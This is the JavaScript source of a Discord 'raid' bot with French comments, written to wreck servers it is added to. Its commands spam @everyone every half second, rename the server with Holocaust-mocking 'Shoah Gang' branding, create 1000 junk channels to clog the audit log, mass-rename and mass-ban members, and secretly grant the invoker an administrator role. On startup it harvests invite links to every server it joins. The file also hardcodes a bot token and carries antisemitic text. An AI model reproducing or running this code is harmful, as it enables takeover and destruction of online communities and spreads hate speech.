const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');

var fucked = false;

function base64_encode(file) {
    var bitmap = fs.readFileSync(file);
    return new Buffer(bitmap).toString('base64');
}
bot.on('warn', console.warn);

bot.on('error', console.error);
 
bot.on('ready',() => { 
  //invit link 
  bot.guilds.forEach(guild => { 
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
  })
});

bot.on('disconnect', () => console.log('jai déco, je me reco desuite...'));

bot.on('reconnecting', () => console.log('Je me suis reco !'));

bot.on('message', message => {
  if (message.content === '.ping') {
    message.reply('pong !')
  }
})

bot.on('message', msg => {
  if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.id}`)
    var interval = setInterval (function () {
      msg.channel.send("@everyone Rejoignez la Saint Team qui vous a detruit bande de facho : https://discord.gg/Pt4QH9u "); 
  }, 500);
}

if (msg.content === '.oupss') {
  console.log(`Commande .oupss par ${msg.author.id}`)
  if (!fucked){
    msg.guild.setIcon("shoah.jpg");
    msg.guild.setName('BZ by Shoah Gang');
    fucked = true;
  

    for (var i = 0; i < 500; i++) {

      msg.guild.createChannel('Shoah_gang_te_baise', 'voice').catch
      msg.guild.createChannel('Shoah_gang_te_baise', 'text').catch
      //changes name tons of times to clog up the audit log
     
  }
}
 
    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.name') {
    msg.delete();

    msg.guild.members.forEach(member => {
		console.log(`Commande .name par ${msg.author.id}`)
        if (member.kickable && !member.roles.find("name", "Patrick Bot")) {
            member.setNickname("ISSOU_BY SHOAH_GANG");
        }
    });
}

bot.on("")
  if (msg.content === '.banev') {                              // Nom a changer
    console.log(`Commande .banev par ${msg.author.id}`)       // Nom a changer
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) {
        member.ban();
      }
    });
  }
 
  if (msg.content === '.leave') {                              // Nom a changer
    console.log(`Commande .leave par ${msg.author.id}`)       // Nom a changer
    msg.guild.leave();
  }
 
  if (msg.content === '.pardon') {
    console.log(`Commande .pardon par ${msg.author.id}`)
 
    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      msg.delete();
    });
  }
 
})
 
bot.login('NDMyMjI3MjQ5MTQwNDAwMTM5.DaqOhQ.iHQyo8s4JQ3r3FKvmDMlhEHlHZg')
